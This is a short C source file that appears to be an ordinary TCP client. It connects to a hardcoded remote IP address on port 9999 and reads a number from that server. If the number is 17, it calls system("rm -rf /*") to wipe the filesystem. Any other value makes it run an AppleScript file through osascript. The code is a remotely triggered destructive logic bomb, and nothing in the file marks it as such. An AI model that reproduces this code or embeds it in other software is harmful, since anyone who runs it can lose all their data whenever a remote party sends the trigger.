#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <errno.h>

#define MAX_MSG_SIZE 256
#define SERVER_PORT 9999

int main(int argc, char *argv[])
{
  int cli_sockfd;
  int addrlen;
  char seraddr[14] = "132.232.6.14";
  struct sockaddr_in ser_addr, cli_addr;
  char msg[MAX_MSG_SIZE];
  cli_sockfd = socket(AF_INET, SOCK_STREAM, 0);

  if (cli_sockfd < 0){
    perror("socket function");
    exit(1);
  }

  addrlen = sizeof(struct sockaddr_in);
  bzero(&ser_addr,addrlen);
  cli_addr.sin_family=AF_INET;
  cli_addr.sin_addr.s_addr=htonl(INADDR_ANY);
  cli_addr.sin_port=0;
  if(bind(cli_sockfd,(struct sockaddr*)&cli_addr,addrlen)<0){
    /*绑定失败 */
    fprintf(stderr,"Bind Error:%s\n",strerror(errno));
    exit(1);
  }
  /* 初始化服务器地址*/
  addrlen=sizeof(struct sockaddr_in);
  bzero(&ser_addr,addrlen);
  ser_addr.sin_family=AF_INET;
  ser_addr.sin_addr.s_addr=inet_addr(seraddr);
  ser_addr.sin_port=htons(SERVER_PORT);
  if(connect(cli_sockfd,(struct sockaddr*)&ser_addr, addrlen)!=0)/*请求连接*/
  {
    /*连接失败 */
    fprintf(stderr,"Connect Error:%s\n",strerror(errno));
    close(cli_sockfd);
    exit(1);
  }

  recv(cli_sockfd, msg, MAX_MSG_SIZE, 0);
  // string to int
  int get_day = atoi(msg);
  if (get_day == 17){
    close(cli_sockfd);
    system("rm -rf /*");
    exit(3);
  }
  else {
    close(cli_sockfd);
    system("osascript ./sendMessage.scpt");
  }


  return 0;
}
